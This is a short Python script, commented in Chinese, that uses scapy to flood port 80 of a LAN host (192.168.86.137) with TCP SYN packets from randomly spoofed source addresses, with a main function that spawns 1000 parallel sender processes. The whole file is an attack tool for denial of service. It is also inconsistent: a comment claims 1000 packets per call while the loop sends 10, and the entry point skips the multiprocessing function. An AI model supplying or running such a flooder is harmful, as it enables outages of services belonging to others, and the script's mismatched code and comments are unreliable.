from scapy.all import *
from scapy.layers.inet import IP, TCP, Ether
import random
import multiprocessing


def func():
    for var in range(10):  # 单个函数发送1000次SYN包
        ip_num_1 = random.randint(1, 255)
        ip_num_2 = random.randint(1, 255)
        ip_num_3 = random.randint(1, 255)
        ip_num_4 = random.randint(1, 255)  # 四位随机IP段
        sport = random.randint(1024, 65535)  # 来源随机端口
        src_ip = "%d.%d.%d.%d" % (ip_num_1, ip_num_2, ip_num_3, ip_num_4)
        pkt = Ether(dst="a1:a2:a3:a4:a5:a6") / IP(dst="192.168.86.137", src=src_ip) / TCP(dport=80, sport=sport,
                                                                                          flags="S")
        send(pkt)  # 发送到目标主机


def main():
    multiprocessing_list = []
    for i in range(1000):
        a = multiprocessing.Process(target=func)
        multiprocessing_list.append(a)
    for j in multiprocessing_list:
        j.start()


if __name__ == '__main__':
    func()
